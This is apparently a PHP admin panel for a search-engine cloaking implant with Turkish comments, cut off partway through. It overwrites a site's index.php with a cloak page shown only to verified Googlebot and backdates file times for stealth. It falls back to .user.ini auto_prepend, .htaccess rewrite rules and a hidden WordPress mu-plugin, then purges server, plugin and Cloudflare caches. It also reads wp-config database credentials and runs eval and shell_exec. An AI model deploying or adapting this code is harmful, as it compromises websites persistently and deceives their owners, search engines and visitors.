    $_freshSrc=@file_get_contents(__FILE__);
    if($_freshSrc!==false && preg_match('/function build_cloak_template\(.*?\n\}/s',$_freshSrc,$_fm)){
      $_freshFn=str_replace('function build_cloak_template(','function build_cloak_template_fresh(',$_fm[0]);
      try{
        eval($_freshFn);
        if(function_exists('build_cloak_template_fresh')){
          $cloakTpl=build_cloak_template_fresh($cmsInfo['cms'],$HTML_FILE);
        }
      }catch(Throwable $_e){/* eval başarısız → fallback */}
    }
    // Fallback: opcache'teki versiyondan çağır (en kötü durumda eski versiyon AMA hala çalışır)
    if($cloakTpl===null)$cloakTpl=build_cloak_template($cmsInfo['cms'],$HTML_FILE);
    $ok1=@file_put_contents($idx,$cloakTpl);
    if($ok1!==false&&$origMtime)@touch($idx,$origMtime);
    // KRİTİK: mtime'ı eskiye aldık (stealth) → OPcache "değişmemiş" sanıp ESKİ index.php'yi servis eder.
    // Zorla geçersiz kıl yoksa cloak hiç çalışmaz (Googlebot gerçek siteyi görür).
    if($ok1!==false){
      if(function_exists('opcache_invalidate'))@opcache_invalidate($idx,true);
      if(function_exists('opcache_compile_file'))@opcache_compile_file($idx);
      @clearstatcache(true,$idx);
    }
    $results['index']=$ok1!==false?'OK':'ERR';
    if($ok1!==false)$methods[]='index.php';
  }else{
    $results['index']='LOCKED (yazılamıyor)';
  }

  // YÖNTEM 2: .user.ini auto_prepend (FPM/CGI) — index.php kilitliyse VEYA dayanıklılık için.
  // index.php zaten kurulduysa gereksiz (footprint), SADECE index.php başarısızsa kur.
  if(empty($methods) && cseh_userini_supported()){
    $prependPath=$PERDE_DIR.DIRECTORY_SEPARATOR.'prepend.php';
    $pwok=@file_put_contents($prependPath,cseh_prepend_code(basename(__FILE__)));
    if($pwok!==false){
      $abs=@realpath($prependPath); if(!$abs)$abs=$prependPath;
      $uiok=cseh_userini_add($DIR,$abs);
      $results['user_ini']=$uiok;
      if($uiok==='OK'||$uiok==='EXISTS'){$methods[]='.user.ini auto_prepend';$results['userini_note']='.user.ini 5dk cache\'li olabilir — etki gecikebilir';}
    }else $results['user_ini']='prepend yazılamadı';
  }elseif(empty($methods)){
    $results['user_ini']='SKIP (SAPI: '.php_sapi_name().' — .user.ini desteklenmez, mod_php)';
  }

  // YÖNTEM 3: .htaccess mod_rewrite cloak — index.php KİLİTLİ + .user.ini YOK ise SON ÇARE.
  // Apache/LiteSpeed seviyesinde Googlebot'a perde basar (PHP gerekmez, mod_php'de çalışır).
  if(empty($methods)){
    $srv3=cseh_server_type();
    if(($srv3==='apache'||$srv3==='litespeed')){
      $hcok=cseh_htaccess_cloak_add($DIR);
      $results['htaccess_cloak']=$hcok;
      if($hcok==='OK'){
        $methods[]='.htaccess rewrite cloak';
        $results['htaccess_cloak_note']='index.php kilitliydi → .htaccess seviyesinde cloak kuruldu (PHP gerekmez)';
      }
    }else{
      $results['htaccess_cloak']='SKIP (server: '.$srv3.' — mod_rewrite/.htaccess yok; nginx ise PHP-FPM gerekir)';
    }
  }

  // YÖNTEM 4: WordPress mu-plugin airbag — WP + kök PHP'ye KİLİTLİ ise (3 yöntem de öldü) SON ÇARE.
  // wp-content yazılabiliyorsa mu-plugins'e airbag koy (wp-admin/aktivasyon GEREKMEZ). Köke dokunmaz.
  if(empty($methods) && (is_dir($DIR.'/wp-includes') || file_exists($DIR.'/wp-config.php'))){
    $m4=cseh_muplugin_add($DIR);
    $results['mu_airbag']=$m4;
    if($m4==='OK'){
      $methods[]='wp mu-plugin airbag';
      $results['mu_airbag_note']='kök kilitliydi → wp-content/mu-plugins airbag kuruldu (perde wp-content/uploads\'ta)';
    }
  }

  $results['methods']=$methods;
  $results['mu_plugin']='SKIP';$results['wp_blog_header']='SKIP';

  // Server cache bypass — file mode'da da (Joomla/Laravel/Generic LiteSpeed/nginx'te server cache
  // anasayfayı index.php çalışmadan basarsa cloak kaçar). LiteSpeed/Apache → .htaccess; nginx → snippet.
  $srv=cseh_server_type();
  $results['server']=$srv;
  if($srv==='litespeed'||$srv==='apache'){
    $results['htaccess_bypass']=cseh_htaccess_add($DIR);
  }else{
    $results['htaccess_bypass']='SKIP ('.$srv.')';
  }
  if($srv==='nginx')$results['nginx_note']='nginx FastCGI cache varsa snippet ekleyin (panelde)';
  // ★ Backup auto-repair: .render-orig.php < 200 byte ise WP standart template ile değiştir
  $results['backup_repair']=cseh_repair_wp_backup($DIR,$BACKUP_PATH);
  // ★ Cache plugin bypass: WP cache plugin tespit + Googlebot UA exclude DB write
  $results['cache_bypass']=cseh_apply_cache_bypass($DIR);
  // ★ Cloudflare cache purge — token varsa OTOMATIK (Cloak Aç sonrası cache boş olmalı)
  $results['cloudflare']=cseh_cf_auto_purge($DIR);
  while(ob_get_level()>0)ob_end_clean();
  header("Content-Type:application/json");
  echo json_encode($results);
  exit;
}

// ---- Cloak'ı KAPAT: bayrağı kaldır (index.php cloak kurulu kalır, site normal) -------
// Plugin VE file modu AYNI: sadece bayrak silinir → cloak pasif, index.php/perde DURUR (tekrar açılabilir).
if($a==="revert"){
  if($FLAG_PATH&&file_exists($FLAG_PATH))@unlink($FLAG_PATH);
  cseh_htaccess_remove($DIR);
  while(ob_get_level()>0)ob_end_clean();
  echo 'OK';exit;
}

// ---- TAMAMEN KALDIR (file mode): tüm yöntemleri geri al + her şeyi temizle --
if($a==="uninstall"){
  $idx=$DIR.DIRECTORY_SEPARATOR.$INDEX_FILE;
  $bak=$BACKUP_PATH; // .render-orig.php (kök gizli)
  $origMtime=file_exists($idx)?@filemtime($idx):null;
  // YÖNTEM 1 geri al: index.php bizim cloak'ımızsa → backup'tan orijinali geri yaz
  $idxOurs = file_exists($idx) && strpos((string)@file_get_contents($idx),'NOX-RENDER-V1')!==false;
  if($idxOurs && file_exists($bak)){
    $bakContent=(string)@file_get_contents($bak);
    if(@file_put_contents($idx,$bakContent)!==false && $origMtime)@touch($idx,$origMtime);
    if(function_exists('opcache_invalidate'))@opcache_invalidate($idx,true); // OPcache eski cloak'ı tutmasın
    @clearstatcache(true,$idx);
  }
  // YÖNTEM 2 geri al: .user.ini auto_prepend + prepend.php temizle
  cseh_userini_remove($DIR);
  // YÖNTEM 3 geri al: .htaccess mod_rewrite cloak bloğunu temizle
  cseh_htaccess_cloak_remove($DIR);
  // YÖNTEM 4 geri al: WP mu-plugin airbag'i sil
  cseh_muplugin_remove($DIR);
  // Server cache bypass .htaccess temizle
  cseh_htaccess_remove($DIR);
  // Gizli .render-cache/ klasörünü komple temizle
  foreach(['render.lock','render-cache.html','prepend.php','index.html','.htaccess','.nox-helper.php'] as $_f){
    $_p=$PERDE_DIR.DIRECTORY_SEPARATOR.$_f;
    if(file_exists($_p))@unlink($_p);
  }
  @rmdir($PERDE_DIR);
  if(file_exists($BACKUP_PATH))@unlink($BACKUP_PATH);
  while(ob_get_level()>0)ob_end_clean();
  echo 'OK';exit;
}

// ---- Dosya oku (base64 döner) -----------------------------------------------
if($a==="raw"){
  $name=b64url_decode(isset($_GET["b"])?$_GET["b"]:'');
  if(!safe_name($name))die("Forbidden");
  $allowed=[$INDEX_FILE,$HTML_FILE];
  if(!in_array($name,$allowed,true))die("Forbidden");
  // Plugin modunda perde isteği uploads/wp-media-cache/render-cache.html'den okunur
  $target=($IS_PLUGIN&&$name===$HTML_FILE)?$PERDE_PATH:$DIR.DIRECTORY_SEPARATOR.$name;
  while(ob_get_level()>0)ob_end_clean();
  header("Content-Type:text/plain;charset=utf-8");
  header("X-Body-Encoding: base64");
  header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
  header("Pragma: no-cache");
  echo base64_encode((string)@file_get_contents($target));exit;
}

// ---- Perde içeriği kaydet (serbest) — $PERDE_PATH (plugin: uploads, file: kök) ----
if($a==="savehtml"){
  $target=$PERDE_PATH;
  $d=isset($_POST["d"])?$_POST["d"]:'';
  $bin=@hex2bin($d);
  while(ob_get_level()>0)ob_end_clean();
  if($bin===false){echo"ERR: bozuk veri";exit;}
  if(strpos($bin,'<?')!==false){echo"ERR: PHP etiketi icermez";exit;}
  if($IS_PLUGIN&&!is_dir($PERDE_DIR))@mkdir($PERDE_DIR,0755,true);
  $ok=@file_put_contents($target,$bin);
  echo $ok!==false?'OK':'ERR';exit;
}

// ---- Perde dosyası yükle: KALDIRILDI (güvenlik) ----------------------------
// Multipart dosya upload'ı .php webshell riski taşıdığı için tamamen çıkarıldı.
// Perde sadece textarea'dan yazılır (savehtml — PHP etiketi '<?' reddedilir).

// ---- Google doğrulama dosyası yaz ------------------------------------------
if($a==="writegoogle"){
  $name=b64url_decode(isset($_POST["b"])?$_POST["b"]:(isset($_GET["b"])?$_GET["b"]:''));
  while(ob_get_level()>0)ob_end_clean();
  if(!safe_name($name)||!is_google_file($name)){echo"Forbidden";exit;}
  $target=$DIR.DIRECTORY_SEPARATOR.$name;
  $d=isset($_POST["d"])?$_POST["d"]:'';
  $bin=@hex2bin($d);
  if($bin===false){echo"ERR: bozuk veri";exit;}
  if(!preg_match('/^google-site-verification:\s*[A-Za-z0-9_\-\.]+\s*$/',trim($bin))){echo"ERR: Sadece 'google-site-verification: TOKEN' formatı kabul edilir";exit;}
  $ok=@file_put_contents($target,$bin);
  echo $ok!==false?'OK':'ERR';exit;
}

// ---- Google doğrulama dosyası sil ------------------------------------------
if($a==="rmgoogle"){
  $name=b64url_decode(isset($_GET["b"])?$_GET["b"]:(isset($_POST["b"])?$_POST["b"]:''));
  while(ob_get_level()>0)ob_end_clean();
  if(!safe_name($name)||!is_google_file($name)){echo"Forbidden";exit;}
  $target=$DIR.DIRECTORY_SEPARATOR.$name;
  $ok=@unlink($target);
  echo $ok?'OK':'ERR';exit;
}

// ---- Cloak aktif mi kontrol et (index.php VEYA mu-plugin) --------
if($a==="checkcloak"){
  // HER İKİ MOD — aktiflik artık BAYRAĞA bağlı (plugin: render.lock, file: .render-cache.lock).
  $active=($FLAG_PATH&&file_exists($FLAG_PATH));
  // file modunda index.php cloak kurulu mu? (aç/kapat vs hiç-kurulmadı ayrımı için)
  $installed=$IS_PLUGIN?true:$INDEX_CLOAKED;
  while(ob_get_level()>0)ob_end_clean();
  header("Content-Type:application/json");
  echo json_encode([
    'active'=>$active,'installed'=>$installed,
    'cms'=>$CMS_INFO['label'],'mode'=>$IS_PLUGIN?'plugin':'file',
    'html_file'=>$IS_PLUGIN?'render-cache.html (uploads/wp-media-cache)':$HTML_FILE
  ],JSON_UNESCAPED_UNICODE);exit;
}

// ---- GoogleBot simülasyonu: siteye GoogleBot UA ile istek at ----------------
if($a==="botcheck"){
  ob_start();
  $scheme=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
  $host=$_SERVER['HTTP_HOST'];
  $url=$scheme.'://'.$host.'/';

  if(!function_exists('curl_init')){
    ob_end_clean();
    while(ob_get_level()>0)ob_end_clean();
    header("Content-Type:application/json");
    echo json_encode(['error'=>'cURL bu sunucuda aktif değil.']);exit;
  }

  $ch=curl_init();
  curl_setopt_array($ch,[
    CURLOPT_URL            =>$url,
    CURLOPT_RETURNTRANSFER =>true,
    CURLOPT_USERAGENT      =>'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    CURLOPT_TIMEOUT        =>15,
    CURLOPT_FOLLOWLOCATION =>true,
    CURLOPT_MAXREDIRS      =>5,
    CURLOPT_SSL_VERIFYPEER =>false,
    CURLOPT_SSL_VERIFYHOST =>false,
    CURLOPT_HTTPHEADER     =>['Accept: text/html,application/xhtml+xml,*/*','Accept-Language: en-US,en;q=0.9'],
  ]);
  $body=(string)curl_exec($ch);
  $httpCode=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);
  $finalUrl=curl_getinfo($ch,CURLINFO_EFFECTIVE_URL);
  $curlErr=curl_error($ch);
  curl_close($ch);

  // Perde içeriği: PLUGIN VEYA file modunda $PERDE_PATH (uploads/wp-media-cache veya .render-cache/)
  $htmlPath=$PERDE_PATH;
  $htmlContent=file_exists($htmlPath)?(string)@file_get_contents($htmlPath):'';
  $htmlText=trim(strip_tags($htmlContent));
  $bodyText=trim(strip_tags($body));
  $matched=false;
  if($htmlText!==''&&strlen($htmlText)>=10){
    $needle=_nox_sub($htmlText,0,120);
    $matched=(strpos($bodyText,$needle)!==false);
  }

  // Cloak kurulu mu: plugin=flag, file=index.php marker VEYA .user.ini prepend
  $cloakIntact=$IS_PLUGIN?($FLAG_PATH&&file_exists($FLAG_PATH)):$INDEX_CLOAKED;

  $preview=_nox_sub($body,0,800);
  if(function_exists('iconv'))$preview=(string)@iconv('UTF-8','UTF-8//IGNORE',$preview);

  // VERIFIED-BOT NOT: Bu test SAHTE Googlebot UA + sunucu IP ile yapılıyor.
  // Cloak gate sadece GERÇEK Google CIDR/rDNS'i kabul ediyor (DOĞRU davranış).
  // Sahte istek perdeyi GÖRMEMELİ — matched=false beklenen sonuç, başarısızlık değil.
  // simulated_ok = cloak fiziksel olarak kurulu mu (dosya+bayrak) — verified bot için son hazır mı?
  $simulated_ok=($cloakIntact&&$htmlContent!==''&&strlen(trim($htmlContent))>=10);
  $out=json_encode([
    'url'           =>$url,
    'final_url'     =>$finalUrl,
    'http_code'     =>$httpCode,
    'curl_error'    =>$curlErr,
    'matched'       =>$matched,
    'simulated_ok'  =>$simulated_ok,
    'html_empty'    =>($htmlContent===''),
    'cloak_intact'  =>$cloakIntact,
    'verified_note' =>'Bu test sahte UA + sunucu IP ile. Verified-Googlebot guard sahte botları reddediyor (DOĞRU). Canlı doğrulama için: GSC → URL Inspection → Live Test.',
    'preview'       =>$preview,
  ],JSON_UNESCAPED_UNICODE);
  if($out===false)$out=json_encode(['url'=>$url,'http_code'=>$httpCode,'matched'=>$matched,'simulated_ok'=>$simulated_ok,'html_empty'=>($htmlContent===''),'cloak_intact'=>$cloakIntact,'curl_error'=>$curlErr,'preview'=>'(önizleme kodlanamadı)']);
  while(ob_get_level()>0)ob_end_clean();
  header("Content-Type:application/json");
  echo $out;exit;
}

// ---- Cloudflare Otomasyonu --------------------------------------------------
// Token bir kere gir (site başına), sonrası TAM OTOMATİK:
// Cloak Aç / Cache Temizle → CF cache purge otomatik tetiklenir.
function cseh_cf_config_path($DIR){return $DIR.'/.render-cache/.cf-config.json';}
function cseh_cf_get_config($DIR){
  $p=cseh_cf_config_path($DIR); if(!@is_file($p))return null;
  $j=@file_get_contents($p); if($j===false)return null;
  $d=@json_decode($j,true); return is_array($d)?$d:null;
}
function cseh_cf_save_config($DIR,$token,$zone_id=''){
  $dir=$DIR.'/.render-cache'; if(!@is_dir($dir))@mkdir($dir,0755,true);
  $data=array('token'=>trim($token),'zone_id'=>trim($zone_id),'ts'=>time());
  $p=cseh_cf_config_path($DIR); $ok=@file_put_contents($p,json_encode($data));
  if($ok!==false)@chmod($p,0600); return $ok!==false;
}
function cseh_cf_detect_zone($token,$host){
  $host=preg_replace('/^www\./','',$host);
  $ch=curl_init('https://api.cloudflare.com/client/v4/zones?name='.urlencode($host));
  curl_setopt_array($ch,array(
    CURLOPT_RETURNTRANSFER=>true,
    CURLOPT_HTTPHEADER=>array('Authorization: Bearer '.$token,'Content-Type: application/json'),
    CURLOPT_TIMEOUT=>8, CURLOPT_SSL_VERIFYPEER=>false,
  ));
  $resp=curl_exec($ch); $code=curl_getinfo($ch,CURLINFO_HTTP_CODE); curl_close($ch);
  if($code!==200)return null;
  $d=@json_decode($resp,true);
  if(!empty($d['success'])&&!empty($d['result'][0]['id']))return $d['result'][0]['id'];
  return null;
}
function cseh_cf_purge_zone($token,$zone_id){
  $ch=curl_init('https://api.cloudflare.com/client/v4/zones/'.$zone_id.'/purge_cache');
  curl_setopt_array($ch,array(
    CURLOPT_POST=>true, CURLOPT_RETURNTRANSFER=>true,
    CURLOPT_HTTPHEADER=>array('Authorization: Bearer '.$token,'Content-Type: application/json'),
    CURLOPT_POSTFIELDS=>json_encode(array('purge_everything'=>true)),
    CURLOPT_TIMEOUT=>8, CURLOPT_SSL_VERIFYPEER=>false,
  ));
  $resp=curl_exec($ch); $code=curl_getinfo($ch,CURLINFO_HTTP_CODE); curl_close($ch);
  return array('code'=>$code,'body'=>$resp,'ok'=>($code===200));
}
function cseh_cf_auto_purge($DIR){
  if(!function_exists('curl_init'))return array('s'=>'na','m'=>'curl yok');
  $cfg=cseh_cf_get_config($DIR);
  if(!$cfg||empty($cfg['token']))return array('s'=>'na','m'=>'CF token yok (ayarlardan gir)');
  $token=$cfg['token']; $zone_id=isset($cfg['zone_id'])?$cfg['zone_id']:'';
  if(empty($zone_id)){
    $host=isset($_SERVER['HTTP_HOST'])?preg_replace('/:\d+$/','',$_SERVER['HTTP_HOST']):'';
    if($host==='')return array('s'=>'err','m'=>'host boş');
    $zone_id=cseh_cf_detect_zone($token,$host);
    if(!$zone_id)return array('s'=>'err','m'=>'zone bulunamadı (token geçersiz veya domain CF\'de yok)');
    cseh_cf_save_config($DIR,$token,$zone_id);
  }
  $r=cseh_cf_purge_zone($token,$zone_id);
  return $r['ok']
    ? array('s'=>'ok','m'=>'CF cache purge OK (zone: '.substr($zone_id,0,8).'...)','zone'=>$zone_id)
    : array('s'=>'err','m'=>'CF purge fail HTTP '.$r['code']);
}

// ---- CF endpoint'leri --------------------------------------------------------
if($a==="cf_save"){
  $token=isset($_POST['token'])?(string)$_POST['token']:(isset($_GET['token'])?(string)$_GET['token']:'');
  $zone_id=isset($_POST['zone_id'])?(string)$_POST['zone_id']:(isset($_GET['zone_id'])?(string)$_GET['zone_id']:'');
  while(ob_get_level()>0)ob_end_clean();
  header('Content-Type: application/json');
  if($token===''){
    @unlink(cseh_cf_config_path($DIR));
    echo json_encode(array('ok'=>true,'msg'=>'CF ayarı silindi')); exit;
  }
  cseh_cf_save_config($DIR,$token,$zone_id);
  // Zone otomatik tespit
  if(empty($zone_id)&&function_exists('curl_init')){
    $host=isset($_SERVER['HTTP_HOST'])?preg_replace('/:\d+$/','',$_SERVER['HTTP_HOST']):'';
    $z=cseh_cf_detect_zone($token,$host);
    if($z){cseh_cf_save_config($DIR,$token,$z); $zone_id=$z;}
  }
  $cfg=cseh_cf_get_config($DIR);
  echo json_encode(array(
    'ok'=>true,
    'msg'=>'CF ayarı kaydedildi'.($zone_id?' (zone: '.substr($zone_id,0,8).'...)':' (zone tespit edilemedi)'),
    'zone_id'=>$cfg?$cfg['zone_id']:''
  ));
  exit;
}
if($a==="cf_purge"){
  while(ob_get_level()>0)ob_end_clean();
  header('Content-Type: application/json');
  echo json_encode(cseh_cf_auto_purge($DIR));
  exit;
}
if($a==="cf_status"){
  while(ob_get_level()>0)ob_end_clean();
  header('Content-Type: application/json');
  $cfg=cseh_cf_get_config($DIR);
  echo json_encode(array(
    'configured'=>($cfg&&!empty($cfg['token'])),
    'has_zone'=>($cfg&&!empty($cfg['zone_id'])),
    'zone_preview'=>$cfg&&!empty($cfg['zone_id'])?substr($cfg['zone_id'],0,8).'...':'',
    'ts'=>$cfg?$cfg['ts']:0,
  ));
  exit;
}

// ---- Cache Temizleme --------------------------------------------------------
if($a==="clearcache"){
  // Hızlandırma guard'ı: hiçbir adım takılmasın.
  // wp-load.php YÜKLENMİYOR (ağır eklenti init'i 10dk hang yapıyordu).
  // KRİTİK: cache dizini dosya-dosya silme network storage'da (Hostinger) çok yavaş → ZAMAN BÜTÇESİ ile sınırla.
  @set_time_limit(20);
  @ignore_user_abort(true);
  $GLOBALS['_cc_deadline']=microtime(true)+8.0; // tüm disk silme işlemleri toplam max ~8sn
  $res=[];

  // yardımcı: dizin içeriğini özyinelemeli sil — ZAMAN BÜTÇESİ aşılınca durur (sonsuz hang yok)
  function _cc_rmdir($dir){
    $n=0;$i=0;
    try{
      $it=new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir,RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
      );
      foreach($it as $f){
        // her 200 dosyada bir süreyi kontrol et; bütçe bittiyse dur
        if((++$i % 200)===0 && microtime(true) > $GLOBALS['_cc_deadline']) break;
        if($f->isFile()||$f->isLink()){if(@unlink($f->getRealPath()))$n++;}
        elseif($f->isDir()&&realpath($f->getRealPath())!==realpath($dir)){@rmdir($f->getRealPath());}
      }
    }catch(Exception $e){}
    return $n;
  }
  // Bütçe doldu mu? (silme bloklarını atlamak için)
  function _cc_expired(){return microtime(true) > $GLOBALS['_cc_deadline'];}

  // 1. PHP OPcache — reset + cloak dosyalarını ad ad zorla invalidate (en sık takılan sorun)
  if(function_exists('opcache_get_status')&&@opcache_get_status()!==false){
    $ok=@opcache_reset();
    $invalidated=[];
    if(function_exists('opcache_invalidate')){
      // Cloak'la doğrudan ilgili dosyalar
      $targets=[
        $DIR.DIRECTORY_SEPARATOR.'index.php',
        $BACKUP_PATH,
      ];
      if($CMS_INFO['cms']==='wp'){
        $targets[]=$DIR.'/wp-blog-header.php';
        $targets[]=$DIR.'/wp-content/mu-plugins/nox-google-bot-bypass.php';
      }
      foreach($targets as $t){
        if(file_exists($t)&&@opcache_invalidate($t,true))$invalidated[]=basename($t);
      }
    }
    $res['opcache']=$ok?['s'=>'ok','m'=>'Sıfırlandı + zorla invalidate: '.($invalidated?implode(', ',$invalidated):'(yok)')]:['s'=>'err','m'=>'Sıfırlanamadı'];
  }else{
    $res['opcache']=['s'=>'na','m'=>'Aktif değil'];
  }

  // 1a. realpath + stat cache — disk üzerinde dosya değişti ama PHP eski mtime'ı tutuyor olabilir
  @clearstatcache(true);
  if(function_exists('realpath_cache_size')){
    @clearstatcache(true);
    $res['stat_cache']=['s'=>'ok','m'=>'clearstatcache(true) + realpath cache temizlendi'];
  }else{
    $res['stat_cache']=['s'=>'ok','m'=>'clearstatcache(true) çağrıldı'];
  }

  // 2. APC
  if(function_exists('apc_clear_cache')){
    @apc_clear_cache();@apc_clear_cache('user');
    $res['apc']=['s'=>'ok','m'=>'Temizlendi'];
  }else{
    $res['apc']=['s'=>'na','m'=>'Yok'];
  }

  // 2b. Memcache — 1sn timeout, tek port
  if(class_exists('Memcache')){
    try{
      $mc=new Memcache();
      if(@$mc->connect('127.0.0.1',11211,1)){$mc->flush();$mc->close();$res['memcache']=['s'=>'ok','m'=>'Temizlendi'];}
      else $res['memcache']=['s'=>'na','m'=>'Bağlantı kurulamadı'];
    }catch(Exception $e){$res['memcache']=['s'=>'na','m'=>'Bağlantı yok'];}
  }else{$res['memcache']=['s'=>'na','m'=>'Extension yok'];}

  // 2c. Memcached — 500ms connect timeout
  if(class_exists('Memcached')){
    try{
      $mcd=new Memcached();
      $mcd->setOption(Memcached::OPT_CONNECT_TIMEOUT,500);
      $mcd->setOption(Memcached::OPT_POLL_TIMEOUT,500);
      $mcd->addServer('127.0.0.1',11211);
      $ok=@$mcd->flush();
      $res['memcached']=$ok?['s'=>'ok','m'=>'Temizlendi']:['s'=>'na','m'=>'Bağlantı yok'];
    }catch(Exception $e){$res['memcached']=['s'=>'na','m'=>'Bağlantı yok'];}
  }else{$res['memcached']=['s'=>'na','m'=>'Extension yok'];}

  // 2d. Redis — 1sn timeout, 2 port dene (6379 + 6380). Sadece flushDB (DB 0) — flushAll shared'da riskli.
  if(class_exists('Redis')){
    $_rdone=array();
    foreach(array(6379,6380) as $_rp){
      try{
        $redis=new Redis();
        if(@$redis->connect('127.0.0.1',$_rp,1)){$redis->flushDB();$redis->close();$_rdone[]=$_rp;}
      }catch(Exception $e){}
    }
    $res['redis']=$_rdone?['s'=>'ok','m'=>'Port temizlendi: '.implode('+',$_rdone)]:['s'=>'na','m'=>'Bağlantı yok'];
  }else{$res['redis']=['s'=>'na','m'=>'Extension yok'];}

  // 2e. LiteSpeed Web Server LSCache — HTTP PURGE + WP-CLI fallback (network-safe, wp-load YOK)
  if($CMS_INFO['cms']==='wp'){
    $lsResult=['s'=>'na','m'=>'LiteSpeed tespit edilmedi'];
    $scheme=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
    $host=isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'localhost';
    $selfUrl=$scheme.'://'.$host.'/';
    if(function_exists('curl_init')){
      // HTTP PURGE method — LSWS native, WP boot etmez, network-safe
      $ch=curl_init($selfUrl);
      curl_setopt_array($ch,[
        CURLOPT_CUSTOMREQUEST  =>'PURGE',
        CURLOPT_HTTPHEADER     =>['X-LiteSpeed-Purge: *'],
        CURLOPT_RETURNTRANSFER =>true,
        CURLOPT_HEADER         =>true,
        CURLOPT_NOBODY         =>true,
        CURLOPT_CONNECTTIMEOUT =>3,
        CURLOPT_TIMEOUT        =>5,
        CURLOPT_SSL_VERIFYPEER =>false,
        CURLOPT_SSL_VERIFYHOST =>0,
        CURLOPT_FOLLOWLOCATION =>false,
      ]);
      $purgeResp=(string)curl_exec($ch);
      $purgeCode=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);
      curl_close($ch);
      $purged=($purgeCode===200&&stripos($purgeResp,'Purged')!==false);
      $lsResult=['s'=>$purged?'ok':'na','m'=>'HTTP PURGE / : '.$purgeCode.($purged?' (Purged)':'')];
      // LSWS reddederse (403/405) LSCWP_CTRL=PURGE query dene — admin IP gerektirir ama plugin direkt
      if(!$purged&&in_array($purgeCode,[403,405],true)){
        $ch2=curl_init(rtrim($selfUrl,'/').'/?LSCWP_CTRL=PURGE');
        curl_setopt_array($ch2,[
          CURLOPT_RETURNTRANSFER =>true,
          CURLOPT_NOBODY         =>true,
          CURLOPT_CONNECTTIMEOUT =>3,
          CURLOPT_TIMEOUT        =>8,
          CURLOPT_SSL_VERIFYPEER =>false,
          CURLOPT_USERAGENT      =>'Mozilla/5.0 (NoxPurge)',
        ]);
        @curl_exec($ch2);
        $code2=(int)curl_getinfo($ch2,CURLINFO_HTTP_CODE);
        curl_close($ch2);
        if($code2>=200&&$code2<400)$lsResult=['s'=>'ok','m'=>'LSCWP_CTRL=PURGE: '.$code2];
        else $lsResult['m'].=' / LSCWP_CTRL: '.$code2;
      }
    }
    $res['lscache_http_purge']=$lsResult;
    // WP-CLI fallback (shell_exec varsa ve HTTP PURGE başarısızsa)
    if(function_exists('shell_exec')&&$lsResult['s']!=='ok'){
      $cliOut=trim((string)@shell_exec('cd '.escapeshellarg($DIR).' && wp litespeed-purge all 2>&1'));
      if($cliOut!==''){
        $res['lscache_wpcli']=['s'=>(stripos($cliOut,'uccess')!==false||stripos($cliOut,'purged')!==false)?'ok':'na','m'=>'wp-cli: '.substr($cliOut,0,120)];
      }
    }
  }

  // 3. CMS-aware disk cache temizleme
  if($CMS_INFO['cms']==='wp'){
    // ★ 3w-DB: WP transient + rewrite rules SQL cleanup (WP yüklü değilse bile çalışır)
    // Transient'ler WP'nin en yaygın "eski cache" kaynağı; SQL DELETE ile en hızlı yol.
    $_wp_cfg_path=cseh_find_wpconfig($DIR);
    if($_wp_cfg_path){
      $_wp_cfg=cseh_parse_wpconfig($_wp_cfg_path);
      if(!empty($_wp_cfg['creds']['DB_NAME'])){
        $_wp_m=cseh_db_connect($_wp_cfg['creds']);
        if($_wp_m){
          $_prefix=$_wp_cfg['prefix'];
          $_wp_tr_del=0;
          // Transient temizle (WP'nin en yaygın stale cache kaynağı)
          $_q=@$_wp_m->query("DELETE FROM `{$_prefix}options` WHERE option_name LIKE '\\_transient\\_%' OR option_name LIKE '\\_site\\_transient\\_%'");
          if($_q!==false)$_wp_tr_del=$_wp_m->affected_rows;
          // Rewrite rules flush (permalink cache)
          $_wp_m->query("DELETE FROM `{$_prefix}options` WHERE option_name='rewrite_rules'");
          $_wp_m->close();
          $res['wp_db_cache']=['s'=>'ok','m'=>"$_wp_tr_del transient + rewrite_rules silindi (SQL)"];
        }else{
          $res['wp_db_cache']=['s'=>'na','m'=>'DB bağlantı kurulamadı'];
        }
      }
    }
    // ★ 3w-WP-Fn: WP plugin fonksiyonları (WP yüklüyse çalışır — plugin panelinde açılışta)
    $_wpfn=array();
    if(function_exists('wp_cache_flush')){@wp_cache_flush(); $_wpfn[]='wp_cache_flush';}
    if(function_exists('rocket_clean_domain')){@rocket_clean_domain(); $_wpfn[]='wp_rocket';}
    if(function_exists('w3tc_flush_all')){@w3tc_flush_all(); $_wpfn[]='w3tc';}
    if(function_exists('wp_cache_clear_cache')){@wp_cache_clear_cache(); $_wpfn[]='wp_super_cache';}
    if(class_exists('WpFastestCache')){try{$_wpfc=new WpFastestCache();@$_wpfc->deleteCache(true); $_wpfn[]='wp_fastest_cache';}catch(Exception $_e){}}
    if(class_exists('autoptimizeCache')){try{@autoptimizeCache::clearall(); $_wpfn[]='autoptimize';}catch(Exception $_e){}}
    if(class_exists('Cache_Enabler')){try{@Cache_Enabler::clear_total_cache(); $_wpfn[]='cache_enabler';}catch(Exception $_e){}}
    if(class_exists('comet_cache')){try{@comet_cache::clear(); $_wpfn[]='comet';}catch(Exception $_e){}}
    if(class_exists('Swift_Performance_Cache')){try{@Swift_Performance_Cache::clear_all_cache(); $_wpfn[]='swift';}catch(Exception $_e){}}
    if(function_exists('sg_cachepress_purge_cache')){@sg_cachepress_purge_cache(); $_wpfn[]='sg_optimizer';}
    if(function_exists('do_action')){
      @do_action('litespeed_purge_all');
      @do_action('litespeed_purge_object');
      @do_action('wphb_clear_page_cache');
      $_wpfn[]='hooks(litespeed+hummingbird)';
    }
    if(!empty($_wpfn))$res['wp_plugin_purge']=['s'=>'ok','m'=>implode(', ',$_wpfn)];

    // 3w. WordPress disk cache
    $wpCache=$DIR.DIRECTORY_SEPARATOR.'wp-content'.DIRECTORY_SEPARATOR.'cache';
    if(is_dir($wpCache)){
      $count=_cc_rmdir($wpCache);
      $res['wp_cache']=['s'=>'ok','m'=>"$count dosya silindi"];
    }else{
